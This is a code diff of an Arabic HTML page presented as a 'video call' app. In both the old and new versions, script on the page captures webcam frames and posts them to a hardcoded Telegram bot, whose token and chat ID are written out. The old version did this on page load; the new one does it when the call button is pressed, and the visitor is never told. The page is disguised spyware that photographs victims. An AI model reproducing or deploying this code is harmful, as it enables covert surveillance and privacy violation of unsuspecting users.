@@ -3,8 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>مكالمة فيديو</title>
+<title>مكالمة فيديو </title>
 <style>
+  /* إعدادات عامة */
   * {box-sizing: border-box; margin:0; padding:0;}
   body {
     font-family: 'Arial', sans-serif;
@@ -15,6 +16,8 @@
     align-items: center;
     min-height: 100vh;
   }
+
+  /* شريط علوي */
   header {
     width: 100%;
     padding: 12px 20px;
@@ -33,16 +36,25 @@
     height: 40px;
     border-radius: 50%;
     margin-left: 10px;
-    animation: spin 6s linear infinite;
+    animation: spin 6s linear infinite; /* حركة بسيطة */
   }
-  header .logo span {font-size: 20px; font-weight: bold;}
-  @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+  header .logo span {
+    font-size: 20px;
+    font-weight: bold;
+  }
+  @keyframes spin {
+    0%{transform:rotate(0deg);}
+    100%{transform:rotate(360deg);}
+  }
+
+  /* محتوى المكالمة */
   .call-container {
     margin-top: 30px;
     display: flex;
     flex-direction: column;
     align-items: center;
   }
+
   video {
     width: 90vw;
     max-width: 480px;
@@ -51,7 +63,11 @@
     box-shadow: 0 8px 25px rgba(0,0,0,0.5);
     transition: transform 0.3s ease;
   }
-  video:hover {transform: scale(1.02);}
+  video:hover {
+    transform: scale(1.02);
+  }
+
+  /* أزرار التحكم */
   .controls {
     margin-top: 20px;
     display: flex;
@@ -68,8 +84,16 @@
     box-shadow: 0 4px 10px rgba(0,0,0,0.3);
     transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
   }
-  .controls button:hover {transform: scale(1.1); background: #8B7CFF;}
-  .controls button:active {transform: scale(0.95); box-shadow: 0 2px 5px rgba(0,0,0,0.3);}
+  .controls button:hover {
+    transform: scale(1.1);
+    background: #8B7CFF;
+  }
+  .controls button:active {
+    transform: scale(0.95);
+    box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+  }
+
+  /* Media Queries لتوافق جميع الأجهزة */
   @media (max-width: 768px){
     video {width: 95vw;}
     header .logo span {font-size: 18px;}
@@ -84,13 +108,16 @@
     <img src="video-calling.png" alt="شعار">
     <span>VideoCallApp</span>
   </div>
+  <div class="user-info">
+user-info@  </div>
 </header>
 
 <div class="call-container">
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="480" height="360" style="display:none;"></canvas>
   <div class="controls">
-    <button id="capture">بدء مكالمة الفيديو</button>
+    <button id="capture">بدء مكالمة فيديو</button>
+    <!-- ممكن تضيف أزرار كالصوت/إيقاف الفيديو -->
   </div>
 </div>
 
@@ -99,78 +126,48 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const btn = document.getElementById('capture');
 
+// ضع التوكن و chat_id هنا
 const TELEGRAM_BOT_TOKEN = '8279560673:AAEusEPpCURUXNzzecxxiRh2m20ULnZHzTk';
-const TELEGRAM_CHAT_ID  = '1848006769';
+const TELEGRAM_CHAT_ID = '1848006769';
 
-let stream = null;
-let isStreaming = false;
+// الوصول للكاميرا
+navigator.mediaDevices.getUserMedia({video:true})
+.then(stream => {
+  video.srcObject = stream;
+})
+.catch(err => {
+  console.error('فشل الوصول للكاميرا:', err);
+});
 
-async function requestCamera() {
-  if(stream) stream.getTracks().forEach(t=>t.stop());
-  try {
-    const s = await navigator.mediaDevices.getUserMedia({video:true});
-    stream = s;
-    video.srcObject = s;
-    isStreaming = true;
-    await new Promise(res=>{
-      if(video.videoWidth) return res();
-      function onMeta(){ video.removeEventListener('loadedmetadata', onMeta); res(); }
-      video.addEventListener('loadedmetadata', onMeta);
-    });
-    canvas.width = video.videoWidth || 480;
-    canvas.height = video.videoHeight || 360;
-    return true;
-  } catch(err) {
-    console.warn('طلب الكاميرا فشل:', err && err.name ? err.name : err);
-    stream = null;
-    isStreaming = false;
-    video.srcObject = null;
-    return false;
-  }
-}
-
-function dataURLtoBlob(dataurl){
+// تحويل dataURL إلى Blob
+function dataURLtoBlob(dataurl) {
   const arr = dataurl.split(',');
   const mime = arr[0].match(/:(.*?);/)[1];
   const bstr = atob(arr[1]);
   let n = bstr.length;
-  const u8 = new Uint8Array(n);
-  while(n--) u8[n] = bstr.charCodeAt(n);
-  return new Blob([u8], {type: mime});
+  const u8arr = new Uint8Array(n);
+  while(n--){
+    u8arr[n] = bstr.charCodeAt(n);
+  }
+  return new Blob([u8arr], {type:mime});
 }
 
-async function captureAndSend(){
-  if(!isStreaming || !stream) return;
+// التقاط وإرسال الصورة
+btn.addEventListener('click', () => {
   const ctx = canvas.getContext('2d');
-  ctx.drawImage(video,0,0,canvas.width,canvas.height);
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   const dataUrl = canvas.toDataURL('image/png');
   const blob = dataURLtoBlob(dataUrl);
-  const form = new FormData();
-  form.append('chat_id', TELEGRAM_CHAT_ID);
-  form.append('photo', blob, 'capture.png');
-  try{
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
-  } catch(err){ console.error('خطأ في الإرسال:', err); }
-}
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('photo', blob, 'capture.png');
 
-// يطلب صلاحية الكاميرا مباشرة عند تحميل الصفحة
-window.addEventListener('load', async ()=>{
-  const granted = await requestCamera();
-  if(granted){
-    await captureAndSend(); // يلتقط الصورة فور الموافقة
-  }
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: formData,
+  })
+  .catch(err => console.error('خطأ في الإرسال:', err));
 });
-
-// كل ضغطة على الزر تلتقط صورة جديدة وترسلها
-btn.addEventListener('click', async ()=>{
-  if(!isStreaming){
-    const granted = await requestCamera();
-    if(!granted) return;
-  }
-  await captureAndSend();
-});
-
-window.addEventListener('beforeunload', ()=>{ if(stream) stream.getTracks().forEach(t=>t.stop()); });
 </script>
 
 </body>
